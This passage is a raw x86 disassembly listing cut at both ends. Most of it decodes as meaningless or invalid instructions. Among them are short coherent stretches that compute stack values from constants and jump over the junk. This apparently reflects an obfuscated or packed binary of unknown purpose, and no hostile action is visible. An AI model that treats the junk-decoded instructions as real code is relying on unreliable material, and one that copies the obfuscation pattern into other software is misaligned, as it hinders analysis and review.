  40f23f:	sbb    edi,DWORD PTR [ecx+0x24]
  40f242:	pusha  
  40f243:	or     BYTE PTR [eax-0x5b],ah
  40f246:	or     ecx,edx
  40f248:	shl    BYTE PTR [ecx+0x4b],cl
  40f24b:	sahf   
  40f24c:	cli    
  40f24d:	lods   eax,DWORD PTR ds:[esi]
  40f24e:	add    eax,0xaffd152b
  40f253:	das    
  40f254:	lahf   
  40f255:	fisub  DWORD PTR [ebx-0xc]
  40f258:	outs   dx,DWORD PTR ds:[esi]
  40f259:	add    al,0x2
  40f25b:	inc    DWORD PTR [ecx+0x5cab5d44]
  40f261:	jmp    0x40f22e
  40f263:	mov    ds:0x9955678c,al
  40f268:	jmp    0xaa3df0d3
  40f26d:	in     eax,0x6d
  40f26f:	and    eax,0x8178c1f1
  40f274:	lea    esi,[ebx]
  40f276:	xchg   esi,eax
  40f277:	addr16 add al,0x41
  40f27a:	and    eax,0x8c3110c8
  40f27f:	and    BYTE PTR cs:[esp+esi*1-0x230ca499],ah
  40f287:	sbb    DWORD PTR [ebp-0x7dd7a71c],ecx
  40f28d:	mul    BYTE PTR [esi+0x7]
  40f290:	pop    ebx
  40f291:	mov    ecx,0x2ca7e586
  40f296:	inc    ecx
  40f297:	sti    
  40f298:	pop    esi
  40f299:	test   DWORD PTR [edx],edx
  40f29b:	outs   dx,BYTE PTR ds:[esi]
  40f29c:	mov    cl,0xb1
  40f29e:	dec    ebp
  40f29f:	inc    edx
  40f2a0:	mov    bh,0xe4
  40f2a2:	xchg   ebx,eax
  40f2a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2a4:	ins    DWORD PTR es:[edi],dx
  40f2a5:	dec    edx
  40f2a6:	rcl    DWORD PTR [eax-0x38],1
  40f2a9:	pop    ebx
  40f2aa:	sbb    BYTE PTR [ecx],bl
  40f2ac:	retf   0x2292
  40f2af:	pop    esi
  40f2b0:	pop    esp
  40f2b1:	ret    
  40f2b2:	rol    DWORD PTR [eax-0x4e],cl
  40f2b5:	fmul   DWORD PTR [edx+eax*2+0x511b445d]
  40f2bc:	hlt    
  40f2bd:	mov    eax,ds:0x68312eb4
  40f2c2:	inc    ecx
  40f2c3:	push   ebp
  40f2c4:	fwait
  40f2c5:	cmp    eax,0x193df3ad
  40f2ca:	xchg   esp,eax
  40f2cb:	inc    esp
  40f2cc:	xchg   ecx,eax
  40f2cd:	out    dx,eax
  40f2ce:	mov    cl,0x49
  40f2d0:	adc    BYTE PTR [ecx-0x3c545b5e],0x82
  40f2d7:	inc    ebx
  40f2d8:	(bad)
  40f2dc:	xor    eax,0xf1d1c4ea
  40f2e1:	mov    edi,0x85bb7909
  40f2e6:	add    dh,BYTE PTR [esi]
  40f2e8:	movlps xmm6,QWORD PTR [edx+esi*4]
  40f2ec:	and    esi,DWORD PTR [edi-0x74]
  40f2ef:	sbb    DWORD PTR [ebx],ebx
  40f2f1:	mov    eax,DWORD PTR [ebx]
  40f2f3:	lea    esp,[ebx]
  40f2f5:	and    eax,0xd6c15998
  40f2fa:	mov    BYTE PTR [ebp+0x21],ah
  40f2fd:	in     al,0x8a
  40f2ff:	mov    edx,0x19197d21
  40f304:	scas   al,BYTE PTR es:[edi]
  40f305:	sbb    DWORD PTR es:[edx],0x42364915
  40f30c:	(bad)  
  40f30e:	xor    ebp,DWORD PTR [esi-0x6e7f29c3]
  40f314:	repz dec ecx
  40f316:	in     al,0x25
  40f318:	into   
  40f319:	xchg   edx,eax
  40f31a:	dec    edi
  40f31b:	sbb    al,0xe5
  40f31d:	gs test edx,edx
  40f320:	cmc    
  40f321:	jg     0x40f33a
  40f323:	addr16 pop es
  40f325:	mov    ebx,0x7c186547
  40f32a:	fsub   st(6),st
  40f32c:	test   eax,eax
  40f32e:	mov    WORD PTR [edx-0x9],es
  40f331:	retf   0x9588
  40f334:	pusha  
  40f335:	or     BYTE PTR [eax+edi*2-0x44],al
  40f339:	mov    dl,BYTE PTR ds:0x447aa0b0
  40f33f:	dec    eax
  40f340:	sub    DWORD PTR ds:0xfc6a5d3f,0x1f
  40f347:	dec    ecx
  40f348:	add    DWORD PTR [edi-0x2],ebp
  40f34b:	std    
  40f34c:	mov    al,ds:0x5e3e818d
  40f351:	pop    ebx
  40f352:	leave  
  40f353:	ret    0xc
  40f356:	push   ebp
  40f357:	mov    ebp,esp
  40f359:	sub    esp,0xec
  40f35f:	push   ebx
  40f360:	push   esi
  40f361:	mov    DWORD PTR [ebp-0x8],0x548e
  40f368:	mov    DWORD PTR [ebp-0x4],0x61c2
  40f36f:	mov    eax,DWORD PTR [ebp-0x4]
  40f372:	jmp    0x40f640
  40f377:	outs   dx,BYTE PTR ds:[esi]
  40f378:	rol    BYTE PTR [eax],cl
  40f37a:	jnp    0x40f399
  40f37c:	cmp    ch,BYTE PTR [edx-0x5e]
  40f37f:	ret    0x499f
  40f382:	push   0xffffff93
  40f384:	mov    WORD PTR [ebx],?
  40f386:	push   0x2b
  40f388:	test   al,0x18
  40f38a:	sbb    BYTE PTR [esi-0x29e7e7ec],bh
  40f390:	or     eax,DWORD PTR [esi-0x7230edda]
  40f396:	xor    edx,DWORD PTR ss:[eax]
  40f399:	js     0x40f384
  40f39b:	mov    ch,0xa4
  40f39d:	lahf   
  40f39e:	add    DWORD PTR [ebp-0x393bc6e9],ebp
  40f3a4:	add    al,0x1c
  40f3a6:	mov    bh,0x32
  40f3a8:	or     BYTE PTR [edx-0x7],0xec
  40f3ac:	mov    dh,0xfa
  40f3ae:	and    eax,0x60f89b49
  40f3b3:	xchg   ecx,eax
  40f3b4:	or     cl,BYTE PTR [ebp-0x42d321a4]
  40f3ba:	jnp    0x40f398
  40f3bc:	or     al,0xbe
  40f3be:	jmp    0x40f38b
  40f3c0:	nop
  40f3c1:	and    eax,0xf08efd3b
  40f3c6:	call   0x4a4d:0x3fc9000a
  40f3cd:	ret    
  40f3ce:	cld    
  40f3cf:	xor    al,0x8f
  40f3d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3d2:	in     eax,0xe0
  40f3d4:	stos   BYTE PTR es:[edi],al
  40f3d5:	mov    cl,0x4f
  40f3d7:	int    0xf9
  40f3d9:	pop    eax
  40f3da:	inc    edx
  40f3db:	add    eax,edx
  40f3dd:	rcl    BYTE PTR [eax+ecx*4],0xfe
  40f3e1:	push   ecx
  40f3e2:	sbb    eax,0xce7d8746
  40f3e7:	adc    ebx,esi
  40f3e9:	mov    ?,ebx
  40f3eb:	fstp   DWORD PTR [ecx]
  40f3ed:	mov    eax,ds:0x6b207aed
  40f3f2:	lds    esp,FWORD PTR [ebp-0x2978550b]
  40f3f8:	sti    
  40f3f9:	test   BYTE PTR [eax],dl
  40f3fb:	fidivr DWORD PTR [esi]
  40f3fd:	push   cs
  40f3fe:	addr16 aaa 
  40f400:	adc    bh,cl
  40f402:	jnp    0x40f3fb
  40f404:	cmp    edi,DWORD PTR [ecx]
  40f406:	or     BYTE PTR ds:0xe2b1be64,dl
  40f40c:	rcl    DWORD PTR [edx-0x6301ce9b],0x85
  40f413:	scas   al,BYTE PTR es:[edi]
  40f414:	xor    BYTE PTR [ebp+0x79],dl
  40f417:	(bad)  
  40f41a:	pop    eax
  40f41b:	sub    dl,dl
  40f41d:	pop    ecx
  40f41e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f41f:	xor    DWORD PTR [edi+0x13],ecx
  40f422:	mov    cl,0xda
  40f424:	xchg   BYTE PTR [ecx+0x1ac8d8a8],bl
  40f42a:	sub    ch,BYTE PTR [eax+0x4f]
  40f42d:	and    eax,0x48c664c9
  40f432:	in     eax,dx
  40f433:	add    BYTE PTR [ebx-0x74],ah
  40f436:	out    dx,eax
  40f437:	xor    BYTE PTR ds:[ebp+0x3a],dh
  40f43b:	aaa    
  40f43c:	popa   
  40f43d:	cli    
  40f43e:	or     DWORD PTR [edx-0x67f4f9fa],0xa3a38f
  40f448:	mov    ecx,0x6155fa9a
  40f44d:	out    0xf3,eax
  40f44f:	mov    ch,BYTE PTR [ecx+0x5c]
  40f452:	push   edi
  40f453:	fisub  DWORD PTR [ebx+0x1e]
  40f456:	cmc    
  40f457:	sahf   
  40f458:	stos   DWORD PTR es:[edi],eax
  40f459:	cdq    
  40f45a:	mov    ch,0x3
  40f45c:	aas    
  40f45d:	arpl   ax,cx
  40f45f:	sahf   
  40f460:	mov    esi,0xecbeaa8b
  40f465:	push   es
  40f466:	xchg   ebp,eax
  40f467:	jne    0x40f421
  40f469:	bound  si,DWORD PTR [edx+0x6a]
  40f46d:	popa   
  40f46e:	hlt    
  40f46f:	mov    esp,0xeba852f8
  40f474:	adc    dl,al
  40f476:	mov    al,ds:0xdbead70c
  40f47b:	sbb    ch,ah
  40f47d:	sub    bl,BYTE PTR [ebx]
  40f47f:	cmp    DWORD PTR [ecx-0x282bc768],0x6a230f7
  40f489:	mov    ebx,0xc918dc4f
  40f48e:	cmc    
  40f48f:	bound  esp,QWORD PTR [edx+0x35]
  40f492:	inc    ebp
  40f493:	data16 (bad) 
  40f495:	cld    
  40f496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f497:	int    0xe9
  40f499:	sbb    esp,DWORD PTR [edi]
  40f49b:	lea    ebx,[ecx-0x4dea6e4e]
  40f4a1:	shl    dl,cl
  40f4a3:	lock jnp 0x40f490
  40f4a6:	mov    al,ds:0x1703d95f
  40f4ab:	mul    DWORD PTR [eax+0x159bc430]
  40f4b1:	cli    
  40f4b2:	mov    ah,BYTE PTR [esi]
  40f4b4:	sub    BYTE PTR [esi],ah
  40f4b6:	fistp  WORD PTR [edi]
  40f4b8:	imul   ecx,ebx,0x1643dc8b
  40f4be:	inc    ebx
  40f4bf:	les    esi,FWORD PTR [ebx+0x6]
  40f4c2:	scas   eax,DWORD PTR es:[edi]
  40f4c3:	dec    esi
  40f4c4:	inc    ebx
  40f4c5:	cmc    
  40f4c6:	mov    esp,0x310b447d
  40f4cb:	imul   ebx,esi,0x5d
  40f4ce:	adc    DWORD PTR [eax+0x453ffa2b],0xfffffff3
  40f4d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4d6:	pop    edx
  40f4d7:	sub    BYTE PTR [eax-0x5b59d9a4],0x2f
  40f4de:	out    dx,eax
  40f4df:	popf   
  40f4e0:	in     al,dx
  40f4e1:	sub    al,0x78
  40f4e3:	int3   
  40f4e4:	mov    ch,BYTE PTR [ebp-0x16]
  40f4e7:	pop    ss
  40f4e8:	out    0xe4,al
  40f4ea:	ins    BYTE PTR es:[edi],dx
  40f4eb:	hlt    
  40f4ec:	push   ecx
  40f4ed:	and    DWORD PTR [ecx],0x22cf2d75
  40f4f3:	icebp  
  40f4f4:	xor    bh,ah
  40f4f6:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40f4f8:	pop    ds
  40f4f9:	outs   dx,DWORD PTR ds:[esi]
  40f4fa:	jne    0x40f50b
  40f4fc:	or     DWORD PTR [ebx+esi*2],edi
  40f4ff:	cwde   
  40f500:	xchg   ebp,eax
  40f501:	stos   DWORD PTR es:[edi],eax
  40f502:	adc    dl,BYTE PTR [edi+esi*1+0x2bf0d141]
  40f509:	into   
  40f50a:	ud0    edi,DWORD PTR gs:[ecx+ecx*2+0x4d2edf19]
  40f513:	imul   eax,DWORD PTR [edx+0x7c],0xffffff8e
  40f517:	or     eax,0xc1ccf937
  40f51c:	mov    edi,0x664be5e7
  40f521:	fcomp  QWORD PTR [ebx+0x180bae38]
  40f527:	cmc    
  40f528:	dec    edx
  40f529:	inc    edx
  40f52a:	sbb    eax,0x4bdae864
  40f52f:	sbb    dh,BYTE PTR [esi]
  40f531:	scas   al,BYTE PTR es:[edi]
  40f532:	popa   
  40f533:	push   esi
  40f534:	jmp    0x1e594b74
  40f539:	fiadd  WORD PTR [esp+edi*8]
  40f53c:	mov    eax,0x3a61d8bb
  40f541:	fldenv [esi+0x3c678466]
  40f547:	data16 add al,0x31
  40f54a:	js     0x40f55b
  40f54c:	dec    DWORD PTR [ebp-0x5cefddec]
  40f552:	pop    esp
  40f553:	cmp    BYTE PTR [edi],al
  40f555:	out    0x4a,al
  40f557:	call   DWORD PTR [esi+0x2efb55af]
  40f55d:	loope  0x40f56f
  40f55f:	xchg   BYTE PTR [ebx],bl
  40f561:	outs   dx,DWORD PTR ds:[esi]
  40f562:	scas   eax,DWORD PTR es:[edi]
  40f563:	push   es
  40f564:	push   ecx
  40f565:	sbb    BYTE PTR [esi+edx*8],dl
  40f568:	sub    al,ah
  40f56a:	fsubr  QWORD PTR [eax-0x5cda7cfb]
  40f570:	stos   DWORD PTR es:[edi],eax
  40f571:	jne    0x40f565
  40f573:	aad    0x83
  40f575:	jl     0x40f57a
  40f577:	psrlq  mm0,0x70
  40f57b:	mov    cl,0x3b
  40f57d:	lahf   
  40f57e:	add    ecx,edx
  40f580:	xor    al,0xd
  40f582:	mov    bl,0x87
  40f584:	xor    DWORD PTR [eax+0x70],edx
  40f587:	rcl    DWORD PTR ds:0x6ad7b90d,cl
  40f58d:	fsubr  st,st(0)
  40f58f:	xor    ah,BYTE PTR [ecx+0x3f]
  40f592:	xor    al,BYTE PTR [ecx+0x51]
  40f595:	push   ecx
  40f596:	pop    ss
  40f597:	add    BYTE PTR [ecx],0x50
  40f59a:	stc    
  40f59b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f59c:	scas   al,BYTE PTR es:[edi]
  40f59d:	jbe    0x40f53f
  40f59f:	call   0x2340:0x8254ce44
  40f5a6:	inc    eax
  40f5a7:	xchg   esp,eax
  40f5a8:	fistp  DWORD PTR [esi+esi*1+0x77]
  40f5ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5ad:	inc    esi
  40f5ae:	mov    ch,0xe3
  40f5b0:	xchg   edx,eax
  40f5b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5b2:	sub    eax,0xebcfb06b
  40f5b7:	mov    esi,0x19f3647f
  40f5bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5bd:	mov    esi,0xe98c7a97
  40f5c2:	mov    dh,BYTE PTR [edx-0x16b03004]
  40f5c8:	lock imul ebx,DWORD PTR [esi],0xffffff8e
  40f5cc:	pop    ds
  40f5cd:	and    eax,0x21876902
  40f5d2:	or     BYTE PTR [esi-0x25],dh
  40f5d5:	sbb    al,bh
  40f5d7:	add    BYTE PTR [ebx],0x3f
  40f5da:	in     eax,dx
  40f5db:	loope  0x40f5e2
  40f5dd:	les    edi,FWORD PTR [eax-0x55]
  40f5e0:	adc    al,BYTE PTR [esi+0x6e5a9af2]
  40f5e6:	or     eax,0xf356454a
  40f5eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5ec:	cmp    edx,0xbb906f9c
  40f5f2:	inc    ebp
  40f5f3:	stc    
  40f5f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5f5:	fwait
  40f5f6:	sbb    esp,DWORD PTR [ebx+0x2]
  40f5f9:	mov    esp,0x448285e3
  40f5fe:	aaa    
  40f5ff:	mov    bl,0x7f
  40f601:	loopne 0x40f5a7
  40f603:	popa   
  40f604:	sahf   
  40f605:	xor    al,0xa9
  40f607:	mov    edi,0xb24bc62
  40f60c:	mov    DWORD PTR [esi+0x2c],ebp
  40f60f:	ficom  WORD PTR [ebx-0x4c8fc93c]
  40f615:	sbb    edx,0xffffffed
  40f618:	out    dx,eax
  40f619:	test   eax,0x2cf5dc74
  40f61e:	xor    BYTE PTR [ecx-0x3e5e7815],0x8d
  40f625:	outs   dx,DWORD PTR ds:[esi]
  40f626:	enter  0xbe1d,0xe2
  40f62a:	mov    eax,0xc9df6644
  40f62f:	sar    BYTE PTR [ebx+0xa],0xd7
  40f633:	bnd jmp 0xddcca13
  40f639:	jnp    0x40f5fb
  40f63b:	stc    
  40f63c:	jno    0x40f67d
  40f63e:	repz cmp ecx,DWORD PTR [ebx-0x5afa07b3]
  40f645:	sbb    al,0x0
  40f647:	add    BYTE PTR [ebx],cl
  40f649:	ror    DWORD PTR [ebx+0x4225680d],0x0
  40f650:	lea    eax,[eax+ecx*1-0x7eef]
  40f657:	mov    DWORD PTR [ebp-0x5c],eax
  40f65a:	mov    DWORD PTR [ebp-0x4],0x8ea
  40f661:	mov    DWORD PTR [ebp-0x8],0x5759
  40f668:	mov    eax,DWORD PTR [ebp-0x8]
  40f66b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f66e:	and    eax,0x27f6
  40f673:	xor    eax,ecx
  40f675:	mov    ecx,DWORD PTR ds:0x42269c
  40f67b:	imul   eax,eax,0x18
  40f67e:	xor    eax,0x17970
  40f683:	lea    eax,[ebp+eax*1-0x54]
  40f687:	mov    DWORD PTR [eax],ecx
  40f689:	mov    DWORD PTR [ebp-0x4],0x7584
  40f690:	mov    DWORD PTR [ebp-0x8],0x7c9f
  40f697:	mov    eax,DWORD PTR [ebp-0x8]
  40f69a:	xor    edx,edx
  40f69c:	push   0x3
  40f69e:	pop    ecx
  40f69f:	div    ecx
  40f6a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6a4:	xor    edx,edx
  40f6a6:	push   0x2
  40f6a8:	add    eax,0x14d3
  40f6ad:	and    eax,ecx
  40f6af:	mov    ecx,0x6404
  40f6b4:	sub    ecx,eax
  40f6b6:	mov    DWORD PTR [ebp-0x74],ecx
  40f6b9:	mov    DWORD PTR [ebp-0xc],0x13b5
  40f6c0:	mov    DWORD PTR [ebp-0x8],0x2e54
  40f6c7:	mov    DWORD PTR [ebp-0x4],0x2f11
  40f6ce:	mov    eax,DWORD PTR [ebp-0x8]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6d4:	lea    eax,[ecx+eax*1-0x65ec]
  40f6db:	mov    ecx,0x5e208
  40f6e0:	div    ecx
  40f6e2:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e5:	lea    eax,[eax+ecx*1+0x40c7]
  40f6ec:	mov    DWORD PTR [ebp-0x24],eax
  40f6ef:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40f6f6:	mov    DWORD PTR [ebp-0x8],0x16ac
  40f6fd:	mov    DWORD PTR [ebp-0xc],0x2185
  40f704:	mov    eax,DWORD PTR [ebp-0xc]
  40f707:	mov    ecx,DWORD PTR [ebp-0x8]
  40f70a:	xor    eax,0x1f75
  40f70f:	sub    eax,ecx
  40f711:	mov    ecx,DWORD PTR [ebp-0x4]
  40f714:	jmp    0x40f9e2
  40f719:	mov    ch,0xd2
  40f71b:	pop    edx
  40f71c:	mov    BYTE PTR [edx+0x20],bl
  40f71f:	stos   DWORD PTR es:[edi],eax
  40f720:	and    dl,BYTE PTR [edx+0x34]
  40f723:	sbb    BYTE PTR [edx-0x4f7ed030],ch
  40f729:	shl    DWORD PTR [edx+0x14be1818],1
  40f72f:	sbb    BYTE PTR [eax],bl
  40f731:	mov    eax,ds:0x7e2fab89
  40f736:	lods   eax,DWORD PTR ds:[esi]
  40f737:	pop    es
  40f738:	and    DWORD PTR [ebx+0x48],edx
  40f73b:	(bad)  
  40f73c:	dec    eax
  40f73d:	mov    ?,WORD PTR [edi+0x29]
  40f740:	test   eax,0x6fc491f8
  40f745:	fstp   DWORD PTR [edx+0x2f4490d9]
  40f74b:	retf   0xaf53
  40f74e:	(bad)  
  40f74f:	stos   DWORD PTR es:[edi],eax
  40f750:	mov    ebp,0xc8da9c05
  40f755:	aam    0x93
  40f757:	mov    eax,0xe1a2f718
  40f75c:	sbb    eax,0x6a7a5506
  40f761:	data16 test BYTE PTR [ecx+0x12291ede],0xe5
  40f769:	fmul   DWORD PTR [edi+0x2c3c03d6]
  40f76f:	inc    eax
  40f770:	mov    dl,0xe2
  40f772:	xlat   BYTE PTR ds:[ebx]
  40f773:	pop    ss
  40f774:	out    dx,eax
  40f775:	in     al,dx
  40f776:	fdiv   DWORD PTR [edx-0x37064dce]
  40f77c:	xor    ebx,ecx
  40f77e:	dec    edi
  40f77f:	cmp    al,0xc3
  40f781:	scas   al,BYTE PTR es:[edi]
  40f782:	arpl   WORD PTR [ecx-0x138a5e19],cx
  40f788:	xacquire xchg DWORD PTR [edi-0x1921a14e],esi
  40f78f:	jno    0x40f779
  40f791:	dec    edx
  40f792:	fiadd  DWORD PTR [eax+0x61f39b30]
  40f798:	inc    ecx
  40f799:	and    ebx,DWORD PTR [ebp+0x7b68cc0f]
  40f79f:	mov    ds:0x56c16951,eax
  40f7a4:	retf   0xa7a1
  40f7a7:	clc    
  40f7a8:	fidiv  WORD PTR [ebx+eax*8-0x387e9b61]
  40f7af:	pop    ebp
  40f7b0:	fnsave [edx]
  40f7b2:	mov    dh,0x50
  40f7b4:	(bad)  
  40f7b6:	mov    cl,0xa4
  40f7b8:	mov    bh,bl
  40f7ba:	mov    ah,0xaf
  40f7bd:	push   ebp
  40f7be:	shl    DWORD PTR [edx],cl
  40f7c0:	push   ecx
  40f7c1:	fs add edi,ebx
  40f7c4:	jmp    0x39104cb4
  40f7c9:	lods   al,BYTE PTR ds:[esi]
  40f7ca:	outs   dx,BYTE PTR ds:[esi]
  40f7cb:	adc    eax,DWORD PTR [ebp-0xe864de7]
  40f7d1:	jns    0x40f82e
  40f7d3:	sahf   
  40f7d4:	jbe    0x40f801
  40f7d6:	adc    esp,DWORD PTR [ebx-0x2b]
  40f7d9:	dec    ebp
  40f7da:	xor    DWORD PTR [ebp-0x7d072a3f],edi
  40f7e0:	add    dh,ah
  40f7e2:	aaa    
  40f7e3:	jecxz  0x40f83f
  40f7e5:	cli    
  40f7e6:	push   cs
  40f7e7:	push   ecx
  40f7e8:	or     eax,0x1e8c16cd
  40f7ed:	ffree  st(1)
  40f7ef:	aad    0x7e
  40f7f1:	cmp    esi,edx
  40f7f3:	jmp    0x40f782
  40f7f5:	test   eax,0xa68efe44
  40f7fa:	lods   al,BYTE PTR ds:[esi]
  40f7fb:	int3   
  40f7fc:	sbb    eax,0xedc20863
  40f801:	pop    eax
  40f802:	dec    ebx
  40f803:	pop    es
  40f804:	jle    0x40f7bb
  40f806:	xchg   DWORD PTR [ecx+0x15734c4],esp
  40f80c:	pop    ebp
  40f80d:	push   ecx
  40f80e:	and    eax,0xb47263eb
  40f813:	push   cs
  40f814:	inc    ebp
  40f815:	imul   ecx,DWORD PTR [eax+0x13],0xffffff8a
  40f819:	punpckhbw mm5,QWORD PTR [edx]
  40f81c:	lea    esp,[esi-0x80]
  40f81f:	jae    0x40f813
  40f821:	mov    ebx,0xee5a4d66
  40f826:	aas    
  40f827:	fucom  st(6)
  40f829:	stc    
  40f82a:	sub    esp,ebp
  40f82c:	(bad)  
  40f82d:	ss pop esi
  40f82f:	fdiv   st,st(3)
  40f831:	std    
  40f832:	clc    
  40f833:	adc    ch,BYTE PTR [edx+0x29a2371b]
  40f839:	jg     0x40f8a1
  40f83b:	popf   
  40f83c:	sub    al,0x80
  40f83e:	mov    ss,ebp
  40f840:	push   ebx
  40f841:	cdq    
  40f842:	pop    esi
  40f843:	mov    ebp,0x4a3c8f06
  40f848:	xor    esi,DWORD PTR [esi-0x74]
  40f84b:	jbe    0x40f8b7
  40f84d:	mov    edx,0x41206390
  40f852:	mov    BYTE PTR [ecx+0x7a],bl
  40f855:	pop    es
  40f856:	xchg   esp,eax
  40f857:	cmp    dl,bh
  40f859:	scas   al,BYTE PTR es:[edi]
  40f85a:	jecxz  0x40f8a8
  40f85c:	in     al,dx
  40f85d:	and    ch,BYTE PTR [eax]
  40f85f:	outs   dx,DWORD PTR ds:[esi]
  40f860:	fld    TBYTE PTR [ebx]
  40f862:	adc    al,ch
  40f864:	ret    0x65db
  40f867:	std    
  40f868:	adc    eax,0x1ec69336
  40f86d:	push   0xffffff9b
  40f86f:	ret    0x504e
  40f872:	adc    BYTE PTR [edx-0x1c7b3067],dh
  40f878:	cmp    edi,ebx
  40f87a:	ins    BYTE PTR es:[edi],dx
  40f87b:	retf   
  40f87c:	add    eax,0x72017d8a
  40f881:	rcr    BYTE PTR [edi-0x74a07f11],0xb1
  40f888:	inc    ecx
  40f889:	jg     0x40f89c
  40f88b:	popf   
  40f88c:	clc    
  40f88d:	test   al,0x60
  40f88f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f890:	or     ebx,DWORD PTR [ebx]
  40f892:	das    
  40f893:	sub    bh,dh
  40f895:	std    
  40f896:	mov    ebx,0xa07dcf96
  40f89b:	mov    ecx,0x1723ae3
  40f8a0:	xor    BYTE PTR [ebp+edi*4-0x44],dh
  40f8a4:	cmp    DWORD PTR [ecx-0x3],0x30bfdba8
  40f8ab:	mov    eax,0x829397b8
  40f8b0:	inc    edx
  40f8b1:	gs jo  0x40f882
  40f8b4:	lahf   
  40f8b5:	xor    al,0x48
  40f8b7:	mov    ebp,0xe29a96b2
  40f8bc:	gs ins BYTE PTR es:[edi],dx
  40f8be:	xor    cl,al
  40f8c0:	loope  0x40f8b1
  40f8c2:	jno    0x40f8d7
  40f8c4:	sahf   
  40f8c5:	fnstenv [edi-0x2c]
  40f8c8:	push   ds
  40f8c9:	fcomp  QWORD PTR [ebx+0x6d71f93e]
  40f8cf:	sbb    al,0xc5
  40f8d1:	sub    al,BYTE PTR [edx+0x7af74be5]
  40f8d7:	fiadd  DWORD PTR [esi]
  40f8d9:	jne    0x40f924
  40f8db:	outs   dx,DWORD PTR ds:[esi]
  40f8dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8dd:	mul    DWORD PTR [ebx-0x22]
  40f8e0:	arpl   di,sp
  40f8e2:	shl    DWORD PTR [ebp+0x65],cl
  40f8e5:	adc    esi,ecx
  40f8e7:	(bad)  
  40f8e8:	call   edi
  40f8ea:	(bad)  
  40f8eb:	dec    DWORD PTR [ebx-0x4b]
  40f8ee:	xor    eax,0xffffff95
  40f8f1:	xor    al,BYTE PTR [ebp+0x6f]
  40f8f4:	dec    edi
  40f8f5:	mov    ecx,0xdbe19144
  40f8fa:	cmp    DWORD PTR [ebx-0x5f],ebx
  40f8fd:	pand   mm2,QWORD PTR [ebx]
  40f900:	int3   
  40f901:	clc    
  40f902:	les    ecx,FWORD PTR [edi-0x31]
  40f905:	mov    esi,0xc96234aa
  40f90a:	in     al,dx
  40f90b:	test   BYTE PTR [ebp+0x75],bh
  40f90e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f90f:	out    dx,al
  40f910:	mov    cl,0xa8
  40f912:	mov    cl,0xc
  40f914:	call   0x98f59ccc
  40f919:	cmp    ah,al
  40f91b:	and    edi,DWORD PTR [ebx+0x756c9b09]
  40f921:	adc    al,0x2d
  40f923:	ret    0xd1f8
  40f926:	rcr    BYTE PTR [esi+0x59],cl
  40f929:	test   eax,0x9855731b
  40f92e:	jb     0x40f917
  40f930:	cwde   
  40f931:	dec    edi
  40f932:	jo     0x40f8c5
  40f934:	ret    0xd2f9
  40f937:	dec    esi
  40f938:	retf   0x2502
  40f93b:	cli    
  40f93c:	and    ecx,DWORD PTR [ebx]
  40f93e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f93f:	mov    al,ds:0xdba8d84d
  40f945:	data16 stos BYTE PTR es:[edi],al
  40f947:	mov    WORD PTR [edi],ds
  40f949:	sbb    al,0x8d
  40f94b:	cli    
  40f94c:	mov    esi,0xd76b40d9
  40f951:	test   DWORD PTR [edx-0x14],ebp
  40f954:	cwde   
  40f955:	ss mov esp,0xb75b424e
  40f95b:	mov    WORD PTR [edx+0x49],ds
  40f95e:	and    eax,0xb7bb691f
  40f963:	push   ebx
  40f964:	lods   al,BYTE PTR ds:[esi]
  40f965:	dec    esi
  40f966:	xchg   BYTE PTR [eax-0x48],bl
  40f969:	test   BYTE PTR [edi+edx*4-0x1c96a4fd],0x61
  40f971:	mov    esp,edi
  40f973:	sbb    BYTE PTR [edi-0x6b637e6e],cl
  40f979:	bound  edi,QWORD PTR [edx]
  40f97b:	push   ss
  40f97c:	jge    0x40f9f3
  40f97e:	jb     0x40f921
  40f980:	(bad)  
  40f981:	out    dx,eax
  40f982:	mov    eax,ds:0xc74d1e51
  40f987:	outs   dx,DWORD PTR ds:[esi]
  40f988:	popa   
  40f989:	cmp    eax,0x97ace21c
  40f98e:	stc    
  40f98f:	(bad)  
  40f990:	rcl    ebp,1
  40f992:	dec    eax
  40f993:	jecxz  0x40f956
  40f995:	push   ss
  40f996:	int3   
  40f997:	call   0xe91f:0x6e3ac19f
  40f99e:	(bad)  
  40f99f:	xchg   edx,eax
  40f9a0:	add    edx,0x1a
  40f9a3:	mov    dl,BYTE PTR [edi+0x3a]
  40f9a6:	into   
  40f9a7:	or     DWORD PTR [edi],eax
  40f9a9:	or     eax,0xedfaf3ad
  40f9ae:	stc    
  40f9af:	int    0x98
  40f9b1:	aad    0xa9
  40f9b3:	test   al,0x5e
  40f9b5:	or     BYTE PTR [ebx],0xdb
  40f9b8:	jp     0x40fa2d
  40f9ba:	add    ebp,DWORD PTR [ebp+0x6ee1f8d1]
  40f9c0:	sti    
  40f9c1:	mov    eax,0x1e58f297
  40f9c6:	jmp    0x6cae:0x94f0c535
  40f9cd:	pop    esp
  40f9ce:	and    eax,0xeb8c3a1e
  40f9d3:	fdivrp st(7),st
  40f9d5:	arpl   WORD PTR [ebx+0x165a2665],cx
  40f9db:	mov    edi,DWORD PTR ds:0xaf65b9a
  40f9e1:	(bad)  
  40f9e2:	sub    eax,ecx
  40f9e4:	xor    eax,0xc3e
  40f9e9:	mov    DWORD PTR [ebp-0x58],eax
  40f9ec:	mov    DWORD PTR [ebp-0x14],0x66bd
  40f9f3:	pop    ecx
  40f9f4:	mov    DWORD PTR [ebp-0x4],ecx
